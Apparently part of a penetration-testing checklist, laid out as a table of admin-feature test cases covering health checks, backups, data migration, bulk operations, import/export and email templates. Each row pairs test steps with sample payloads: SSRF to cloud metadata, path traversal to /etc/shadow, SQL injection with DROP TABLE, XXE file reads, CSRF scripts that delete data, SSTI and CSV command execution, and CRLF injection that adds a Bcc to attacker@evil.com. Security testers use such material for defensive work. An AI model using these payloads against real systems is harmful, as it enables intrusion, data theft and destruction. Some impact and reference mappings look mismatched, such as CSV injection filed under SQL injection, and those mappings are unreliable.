| ADMIN-041 | Health Endpoint SSRF | SSRF (WSTG-INPV-19) | System Health Monitoring | 1. If health monitoring checks external services check for SSRF.<br>2. Modify health check URLs if configurable.<br>3. Point health checks to internal services.<br>4. Check for service discovery via health endpoints. | Application must not allow user-controlled health check URLs and must validate any configurable monitoring endpoints against allowlists. | <code>health_check_url=http://169.254.169.254/latest/meta-data/;monitor_endpoint=http://localhost:6379/;check_url=http://10.0.0.1:8080/</code> | SSRF -&gt; internal-service reach / cloud metadata credential theft. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Collaborator | CWE-918; [SSRF kit](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger |
| ADMIN-042 | Health Monitoring DoS via Expensive Checks | Business Logic (WSTG-BUSL-05) | System Health Monitoring | 1. Trigger health check endpoints rapidly.<br>2. Check if expensive health checks like database queries or external API calls are rate limited.<br>3. Monitor for performance degradation from repeated health checks. | Application must rate limit health monitoring endpoints and implement caching for expensive health checks to prevent DoS through monitoring abuse. | <code>Send 1000+ GET /api/admin/health/detailed requests per minute;trigger expensive database health checks rapidly</code> | Denial of service -&gt; availability impact for this feature / the app. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite Intruder;JMeter | CWE-400; [Race Condition kit](#/checklist/racecondition); OWASP; PortSwigger |
| ADMIN-043 | Actuator Endpoints Exposure (Spring Boot) | Security Misconfiguration (WSTG-CONF-01) | System Health Monitoring | 1. Check for exposed Spring Boot Actuator endpoints.<br>2. Test /actuator/env for environment variables.<br>3. Check /actuator/heapdump for memory dump.<br>4. Test /actuator/shutdown for application shutdown.<br>5. Check /actuator/jolokia for JMX access. | Application must disable or restrict all non-essential Actuator endpoints in production and require authentication for any exposed endpoints. | <code>GET /actuator;/actuator/env;/actuator/heapdump;/actuator/configprops;/actuator/beans;/actuator/mappings;/actuator/shutdown</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Nuclei;DirBuster | CWE-200; [JWT kit](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| ADMIN-044 | Debug Endpoint Exposure | Security Misconfiguration (WSTG-CONF-01) | System Health Monitoring | 1. Check for exposed debug endpoints.<br>2. Test for phpinfo pages.<br>3. Check for profiler endpoints.<br>4. Test for debug toolbar access.<br>5. Verify debug mode is disabled in production. | All debug endpoints and tools must be disabled in production environments with no debug information accessible to any user. | <code>GET /debug;/phpinfo.php;/_debugbar;/profiler;/__debug__;/elmah.axd;/trace;/debug/pprof with no authentication</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;DirBuster;Nuclei | CWE-200; [JWT kit](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| ADMIN-045 | Unauthorized Backup Access | Broken Access Control (WSTG-AUTHZ-02) | Backup / Restore | 1. Attempt to access backup management endpoints as non-admin.<br>2. List available backups.<br>3. Download backup files.<br>4. Check for backup files in predictable locations.<br>5. Test with different role levels. | Application must restrict all backup operations to authorized super-admin roles and store backups in secure non-web-accessible locations. | <code>GET /api/admin/backups;GET /api/admin/backups/download/latest;check /backups/;/backup/;/db-backup/ paths</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;DirBuster | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ADMIN-046 | Backup File Path Traversal | Path Traversal (WSTG-INPV-10) | Backup / Restore | 1. Download a backup file.<br>2. Modify the file path parameter to traverse directories.<br>3. Attempt to read arbitrary server files.<br>4. Test with encoded traversal sequences. | Application must validate backup file paths strictly and prevent directory traversal in backup download functionality. | <code>GET /api/admin/backups/download?file=../../../etc/passwd;file=....//....//etc/shadow;file=%2e%2e%2f%2e%2e%2f</code> | Path traversal -&gt; secret/cross-user file read or out-of-dir write -&gt; RCE. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-22; [Path Traversal kit](#/checklist/pathtraversal); PortSwigger path traversal; Orange Tsai |
| ADMIN-047 | Backup Contains Sensitive Unencrypted Data | Information Disclosure (WSTG-INFO-05) | Backup / Restore | 1. Create a backup.<br>2. Download and inspect the backup file.<br>3. Check if backup contains plaintext passwords and API keys and encryption keys.<br>4. Verify backup encryption.<br>5. Check for PII exposure. | Backups must be encrypted at rest with strong encryption and must not contain plaintext sensitive data like passwords or encryption keys. | <code>Download backup file and search for password;api_key;secret_key;private_key;credit_card in plaintext</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Manual Review;Grep;Custom Scripts | CWE-200; [JWT kit](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| ADMIN-048 | Unauthorized Restore Operation | Broken Access Control (WSTG-AUTHZ-02) | Backup / Restore | 1. Attempt to trigger a restore operation as non-super-admin.<br>2. Restore from a manipulated backup file.<br>3. Check if restore requires re-authentication.<br>4. Verify restore confirmation workflow. | Application must restrict restore operations to super-admins with mandatory re-authentication and confirmation before executing any restore. | <code>POST /api/admin/backups/restore with regular admin credentials;restore without re-authentication challenge</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ADMIN-049 | Backup Injection via Malicious Restore | Injection (WSTG-INPV-08) | Backup / Restore | 1. Download a backup file.<br>2. Modify the backup contents to inject malicious data.<br>3. Inject SQL commands or admin users into the backup.<br>4. Upload the modified backup.<br>5. Trigger restore. | Application must validate backup file integrity using checksums or digital signatures and reject tampered backups. | <code>Modify backup SQL to add INSERT INTO users VALUES('hacker','admin');modify backup JSON to inject admin user;change backup checksum</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Custom Scripts | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| ADMIN-050 | CSRF on Backup Deletion | CSRF (WSTG-SESS-05) | Backup / Restore | 1. Craft a malicious page that deletes all backups.<br>2. Lure super-admin to visit.<br>3. Check if backup deletion requires CSRF token and re-authentication. | Application must validate CSRF tokens and require re-authentication for destructive backup operations like deletion. | <code>&lt;script&gt;fetch('/api/admin/backups/delete-all',{method:'DELETE',credentials:'include'})&lt;/script&gt;</code> | CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO. | Critical | 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N) | Burp Suite;Custom HTML | CWE-352; [CSRF kit](#/checklist/csrf); PortSwigger CSRF + SameSite |
| ADMIN-051 | Backup Enumeration and Unauthorized Download | Information Disclosure (WSTG-INFO-04) | Backup / Restore | 1. Enumerate backup file names by pattern or sequential naming.<br>2. Attempt direct URL access to backup files.<br>3. Check for backups in common paths.<br>4. Test for directory listing in backup storage. | Application must store backups in non-web-accessible locations with non-predictable filenames and require authentication for all access. | <code>Access /backups/backup-2025-01-01.sql;/backups/latest.tar.gz;enumerate date-based backup filenames</code> | Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;DirBuster;ffuf | CWE-204; [Account Takeover kit](#/checklist/ato); OWASP WSTG-IDNT-04 |
| ADMIN-052 | Backup Scheduling Manipulation | Business Logic (WSTG-BUSL-01) | Backup / Restore | 1. Modify backup schedule settings.<br>2. Set extremely frequent backups to exhaust storage.<br>3. Disable scheduled backups.<br>4. Check if schedule changes require authorization. | Application must restrict backup schedule modifications to authorized admins and enforce reasonable frequency limits. | <code>PUT /api/admin/backups/schedule with interval=every_minute;set enabled=false;change retention=0</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ADMIN-053 | Data Migration SQL Injection | Injection (WSTG-INPV-05) | Data Migration | 1. If data migration accepts SQL or query inputs inject SQL payloads.<br>2. Test migration configuration parameters.<br>3. Check for injection in source and destination connection strings.<br>4. Test field mapping for injection. | Application must use parameterized queries and validate all inputs in data migration processes. | <code>source_query=' OR 1=1--;migration_config=test'; DROP TABLE users;--;field_map=name' UNION SELECT password--</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | SQLMap;Burp Suite | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| ADMIN-054 | Data Migration Authorization Bypass | Broken Access Control (WSTG-AUTHZ-02) | Data Migration | 1. Attempt to trigger data migration as non-admin.<br>2. Access migration configuration endpoints.<br>3. Check if migration status is visible to unauthorized users.<br>4. Test with different role levels. | Application must restrict all data migration operations to authorized super-admin roles with mandatory approval workflows. | <code>POST /api/admin/migration/start with regular admin token;GET /api/admin/migration/status with non-admin credentials</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ADMIN-055 | Data Migration Sensitive Data Exposure | Information Disclosure (WSTG-INFO-05) | Data Migration | 1. Monitor data migration process.<br>2. Check if migration logs expose sensitive data.<br>3. Verify if data is encrypted during migration.<br>4. Check for data exposure in temporary migration files. | Data migration must encrypt data in transit and at rest and migration logs must not contain sensitive data values. | <code>Check migration logs for plaintext passwords;credit_cards;SSN;check temporary files for unencrypted data dumps</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Manual Review;Burp Suite | CWE-200; [JWT kit](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| ADMIN-056 | Data Migration SSRF via Source Configuration | SSRF (WSTG-INPV-19) | Data Migration | 1. Configure data migration source.<br>2. Set source URL to internal network addresses.<br>3. Trigger migration.<br>4. Check if internal services are accessed through migration source. | Application must validate migration source URLs against allowlists and block access to internal network resources. | <code>source_url=http://169.254.169.254/latest/meta-data/;db_host=localhost;source=http://10.0.0.1:3306/</code> | SSRF -&gt; internal-service reach / cloud metadata credential theft. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Collaborator | CWE-918; [SSRF kit](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger |
| ADMIN-057 | Data Migration Race Condition | Business Logic (WSTG-BUSL-08) | Data Migration | 1. Trigger multiple simultaneous migration operations.<br>2. Check for data corruption from concurrent migrations.<br>3. Test for duplicate records.<br>4. Verify atomicity of migration transactions. | Application must prevent concurrent migration operations and implement proper locking to prevent data corruption. | <code>Trigger concurrent POST /api/admin/migration/start from multiple sessions;check for duplicate data and corruption</code> | Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend). | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Turbo Intruder;Burp Suite | CWE-362; [Race Condition kit](#/checklist/racecondition); James Kettle Smashing the State Machine |
| ADMIN-058 | Data Migration Rollback Vulnerability | Business Logic (WSTG-BUSL-02) | Data Migration | 1. Start a data migration.<br>2. Interrupt it mid-process.<br>3. Check if partial migration leaves data in inconsistent state.<br>4. Test rollback functionality.<br>5. Verify data integrity after failed migration. | Application must implement atomic migration transactions with proper rollback capability to prevent data inconsistency from failed migrations. | <code>Interrupt POST /api/admin/migration/start mid-process;check data state;verify rollback restores consistent state</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ADMIN-059 | Data Migration XXE via XML Import | Injection (WSTG-INPV-07) | Data Migration | 1. If migration accepts XML data create XML with XXE payload.<br>2. Upload malicious XML for migration.<br>3. Check if external entities are resolved.<br>4. Test for blind XXE via out-of-band. | Application must disable external entity processing in all XML parsers used during data migration. | <code>&lt;?xml version='1.0'?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM 'file:///etc/passwd'&gt;]&gt;&lt;migration&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/migration&gt;</code> | XXE -&gt; local file read / SSRF / OOB exfiltration. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;OWASP ZAP | CWE-611; [XXE kit](#/checklist/xxe); PortSwigger XXE |
| ADMIN-060 | Bulk Operation Authorization Bypass | Broken Access Control (WSTG-AUTHZ-02) | Bulk Operations | 1. Attempt bulk operations as non-admin.<br>2. Test bulk user deletion and role changes and status updates.<br>3. Check if individual item authorization is enforced in bulk.<br>4. Test with mixed authorized and unauthorized items. | Application must validate authorization for each individual item in a bulk operation and reject unauthorized items while processing authorized ones. | <code>POST /api/admin/bulk/delete with non-admin token;include items from different tenants in bulk operation</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ADMIN-061 | Bulk Operation IDOR | Broken Access Control (WSTG-AUTHZ-04) | Bulk Operations | 1. Perform a bulk operation on own resources.<br>2. Include resource IDs from other tenants in the bulk array.<br>3. Check if cross-tenant resources are affected.<br>4. Test with mixed tenant IDs. | Application must verify ownership and tenant isolation for every item in bulk operations individually. | <code>POST /api/admin/bulk/update with ids=[1001;2001;3001] including IDs from other tenants</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ADMIN-062 | Bulk Operation Denial of Service | Business Logic (WSTG-BUSL-05) | Bulk Operations | 1. Submit a bulk operation with millions of items.<br>2. Check if item count limits are enforced.<br>3. Monitor server performance during large bulk operations.<br>4. Test for timeout and memory exhaustion. | Application must enforce maximum item counts on bulk operations and process large batches asynchronously with progress tracking. | <code>POST /api/admin/bulk/process with item_ids containing 1000000 IDs;check for count limits and async processing</code> | Denial of service -&gt; availability impact for this feature / the app. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Custom Scripts | CWE-400; [Race Condition kit](#/checklist/racecondition); OWASP; PortSwigger |
| ADMIN-063 | Bulk Operation SQL Injection | Injection (WSTG-INPV-05) | Bulk Operations | 1. Submit bulk operation with SQL injection in item identifiers.<br>2. Test with injection in filter parameters used for bulk selection.<br>3. Check for SQL errors in bulk processing. | Application must use parameterized queries for all bulk operation database operations including item selection and processing. | <code>POST /api/admin/bulk/delete with ids=["1001' OR '1'='1"];filter=status=' OR 1=1-- in bulk select</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | SQLMap;Burp Suite | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| ADMIN-064 | Bulk Operation Race Condition | Business Logic (WSTG-BUSL-08) | Bulk Operations | 1. Submit the same bulk operation simultaneously from two sessions.<br>2. Check if items are processed twice.<br>3. Test for duplicate effects from concurrent bulk operations.<br>4. Verify idempotency. | Application must implement idempotent bulk operations with proper locking to prevent duplicate processing from concurrent submissions. | <code>Send concurrent POST /api/admin/bulk/process with same item_ids from two admin sessions</code> | Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend). | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Turbo Intruder;Burp Suite | CWE-362; [Race Condition kit](#/checklist/racecondition); James Kettle Smashing the State Machine |
| ADMIN-065 | CSRF on Bulk Deletion | CSRF (WSTG-SESS-05) | Bulk Operations | 1. Craft a malicious page that triggers bulk deletion of critical resources.<br>2. Lure admin to visit.<br>3. Check if CSRF token and confirmation are required for bulk destructive operations. | Application must validate CSRF tokens and require explicit confirmation for all bulk destructive operations. | <code>&lt;script&gt;fetch('/api/admin/bulk/delete',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:'{"ids":["all"]}'})&lt;/script&gt;</code> | CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO. | Critical | 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N) | Burp Suite;Custom HTML | CWE-352; [CSRF kit](#/checklist/csrf); PortSwigger CSRF + SameSite |
| ADMIN-066 | Bulk Operation CSV Injection via Import | Injection (WSTG-INPV-01) | Bulk Operations | 1. Upload a CSV for bulk import containing formula payloads.<br>2. Process the bulk import.<br>3. Export the data.<br>4. Check if formulas execute in spreadsheet applications. | Application must sanitize CSV data during bulk import by escaping formula-triggering characters. | <code>CSV: =cmd&#124;'/C calc'!A0;+cmd&#124;'/C calc'!A0;-cmd&#124;'/C calc'!A0;@SUM(1+1)&#42;cmd&#124;'/C calc'!A0 in bulk import file</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Manual Testing | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| ADMIN-067 | Import File XXE Injection | Injection (WSTG-INPV-07) | Import / Export Tools | 1. If import tools accept XML create XML file with XXE payload.<br>2. Upload the malicious file.<br>3. Check if external entities are resolved.<br>4. Test for blind XXE and SSRF via XXE. | Application must disable external entity processing in all XML parsers used in import tools. | <code>Upload XML: &lt;?xml version='1.0'?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM 'file:///etc/passwd'&gt;]&gt;&lt;import&gt;&amp;xxe;&lt;/import&gt;</code> | XXE -&gt; local file read / SSRF / OOB exfiltration. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;OWASP ZAP | CWE-611; [XXE kit](#/checklist/xxe); PortSwigger XXE |
| ADMIN-068 | Import Tool Path Traversal | Path Traversal (WSTG-INPV-10) | Import / Export Tools | 1. Import a file.<br>2. If file path is a parameter attempt directory traversal.<br>3. Test with ZIP files containing path traversal in filenames (Zip Slip).<br>4. Check for arbitrary file write. | Application must validate import file paths and archive contents to prevent directory traversal and arbitrary file write attacks. | <code>import_file=../../../etc/passwd;upload ZIP with ../../var/www/html/shell.php entry;test encoded traversal</code> | Path traversal -&gt; secret/cross-user file read or out-of-dir write -&gt; RCE. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;evilarc;Custom Scripts | CWE-22; [Path Traversal kit](#/checklist/pathtraversal); PortSwigger path traversal; Orange Tsai |
| ADMIN-069 | Export Tool IDOR for Data Exfiltration | Broken Access Control (WSTG-AUTHZ-04) | Import / Export Tools | 1. Export own data.<br>2. Change tenant_id or scope parameter to export data from other tenants.<br>3. Check if export includes data beyond authorization.<br>4. Test with all_data or full_export parameters. | Application must enforce strict authorization on export operations preventing cross-tenant data extraction. | <code>GET /api/admin/export?tenant_id=TENANT-2001;GET /api/admin/export?scope=all_tenants with single-tenant admin credentials</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ADMIN-070 | Export Tool Sensitive Data Inclusion | Information Disclosure (WSTG-INFO-05) | Import / Export Tools | 1. Perform data export.<br>2. Inspect export file for sensitive fields.<br>3. Check if export includes password hashes and API keys and payment data.<br>4. Verify data classification in export. | Export tools must exclude sensitive data like password hashes and encryption keys and apply data classification rules to export content. | <code>Check export for password_hash;api_secret;encryption_key;full_credit_card;ssn;internal_notes in exported file</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Manual Review;Custom Scripts | CWE-200; [JWT kit](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| ADMIN-071 | Import Tool Malicious File Upload | File Upload (WSTG-INPV-12) | Import / Export Tools | 1. Upload malicious files via the import tool.<br>2. Upload web shells disguised as import files.<br>3. Test with polyglot files.<br>4. Upload oversized files.<br>5. Test with executable content. | Application must validate import file content by inspection and scan for malware and enforce file size limits. | <code>Upload shell.php.csv;import.xml with XXE;polyglot.xlsx with embedded macros;100GB import file</code> | Malicious file upload -&gt; RCE / stored XSS / parser XXE depending on handling. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;ClamAV;Custom Files | CWE-434; [File Upload kit](#/checklist/fileupload); PortSwigger File upload; ImageTragick |
| ADMIN-072 | Import Tool SQL Injection via Data Fields | Injection (WSTG-INPV-05) | Import / Export Tools | 1. Create an import file with SQL injection payloads in data fields.<br>2. Process the import.<br>3. Check if SQL payloads are executed during import processing.<br>4. Observe for data leakage or manipulation. | Application must use parameterized queries when inserting imported data into the database. | <code>CSV row: "' OR 1=1--";"test@test.com";"admin' UNION SELECT password FROM users--"</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | SQLMap;Burp Suite | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| ADMIN-073 | Export Tool Unauthorized Access | Broken Access Control (WSTG-AUTHZ-02) | Import / Export Tools | 1. Attempt data export as non-admin user.<br>2. Access export API endpoints.<br>3. Check if export generates files accessible without authentication.<br>4. Test for direct file download bypass. | Application must restrict export functionality to authorized admin roles and protect generated export files with authentication. | <code>GET /api/admin/export with non-admin token;access export file URL without authentication;check for publicly accessible exports</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ADMIN-074 | Import Data Validation Bypass | Input Validation (WSTG-INPV-01) | Import / Export Tools | 1. Import file with invalid or malicious data values.<br>2. Include values that would fail frontend validation.<br>3. Import negative amounts and future dates and invalid references.<br>4. Check server-side validation. | Application must perform thorough server-side validation on all imported data identical to or stricter than manual data entry validation. | <code>Import CSV with negative_price=-999;invalid_email=not-an-email;date=9999-99-99;quantity=2147483648</code> | Improper input validation -&gt; downstream injection / logic abuse. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Custom Files | CWE-20; [XSS kit](#/checklist/xss); OWASP Input Validation Cheat Sheet |
| ADMIN-075 | Import Tool Deserialization Vulnerability | Injection (WSTG-INPV-08) | Import / Export Tools | 1. If import processes serialized data check for insecure deserialization.<br>2. Inject malicious serialized objects.<br>3. Test with Java and PHP and Python serialization formats.<br>4. Check for RCE. | Application must avoid deserializing untrusted import data and validate all deserialized objects. | <code>Include ysoserial payload in Java import;PHPGGC chain in PHP import;malicious pickle in Python import</code> | Insecure deserialization -&gt; remote code execution. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | ysoserial;PHPGGC;Burp Suite | CWE-502; [Deserialization kit](#/checklist/deser); Bechler 'Java Unmarshaller Security'; ysoserial |
| ADMIN-076 | SSTI in Email Template Editing | Injection (WSTG-INPV-18) | Email Templates | 1. Access email template editor.<br>2. Inject SSTI payloads in template content.<br>3. Save and trigger the email.<br>4. Check if template engine evaluates injected expressions.<br>5. Test for RCE. | Application must sandbox template editing and prevent injection of dangerous template constructs that could lead to code execution. | <code>template_body={{7&#42;7}};email_content=${Runtime.getRuntime().exec('id')};subject=&lt;%= system('whoami') %&gt;;{{config.__class__.__init__.__globals__}}</code> | Server-side template injection -&gt; remote code execution on the app server. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Tplmap | CWE-1336; [SSTI kit](#/checklist/ssti); PortSwigger SSTI (James Kettle) |
| ADMIN-077 | Unauthorized Email Template Modification | Broken Access Control (WSTG-AUTHZ-02) | Email Templates | 1. As a regular admin attempt to modify email templates.<br>2. Access template management API.<br>3. Modify critical templates like password reset and account verification.<br>4. Check for role-based template access. | Application must restrict email template modification to authorized roles and implement version control with approval workflow for template changes. | <code>PUT /api/admin/email-templates/password-reset with regular admin credentials;modify verification_email template</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ADMIN-078 | XSS in Email Template Preview | Cross-Site Scripting (WSTG-INPV-02) | Email Templates | 1. Edit an email template with XSS payload.<br>2. Use the template preview function.<br>3. Check if the XSS executes in the admin's browser during preview.<br>4. Test with different rendering contexts. | Application must sanitize template preview rendering and execute previews in a sandboxed context to prevent XSS. | <code>template_content=&lt;script&gt;alert(document.cookie)&lt;/script&gt;;preview_data=&lt;img src=x onerror=alert(1)&gt;</code> | Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Suite;XSS Hunter | CWE-79; [XSS kit](#/checklist/xss); PortSwigger XSS; Cure53 |
| ADMIN-079 | Email Template IDOR | Broken Access Control (WSTG-AUTHZ-04) | Email Templates | 1. Access own organization's email templates.<br>2. Change template_id to access another tenant's templates.<br>3. Enumerate template IDs.<br>4. Check for cross-tenant template exposure. | Application must enforce tenant isolation on email templates and prevent cross-tenant template access. | <code>GET /api/admin/email-templates/TMPL-2001 with TENANT-1001 credentials;enumerate TMPL-0001 through TMPL-9999</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ADMIN-080 | Email Template Header Injection | Injection (WSTG-INPV-11) | Email Templates | 1. If templates allow dynamic headers inject CRLF characters.<br>2. Add unauthorized email headers like Bcc.<br>3. Test for header injection in From and Reply-To fields. | Application must sanitize all dynamic values used in email headers within templates and prevent header injection. | <code>template_from=admin@target.com%0d%0aBcc:attacker@evil.com;reply_to=legit@target.com%0d%0aCc:spy@evil.com</code> | CRLF/response-splitting -&gt; header injection, cache poisoning, session fixation. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Custom Scripts | CWE-113; [Host Header kit](#/checklist/hostheader); OWASP CRLF Injection; PortSwigger |
| ADMIN-081 | Email Template SSRF via Image URLs | SSRF (WSTG-INPV-19) | Email Templates | 1. Include image URLs in email templates.<br>2. Set image source to internal service URLs.<br>3. Trigger email sending.<br>4. Check if the email server fetches internal resources. | Application must validate all URLs in email templates against allowlists and prevent server-side fetching of internal resources. | <code>template_image=http://169.254.169.254/latest/meta-data/;logo_url=http://localhost:8080/admin;image=http://10.0.0.1/</code> | SSRF -&gt; internal-service reach / cloud metadata credential theft. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Collaborator | CWE-918; [SSRF kit](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger |
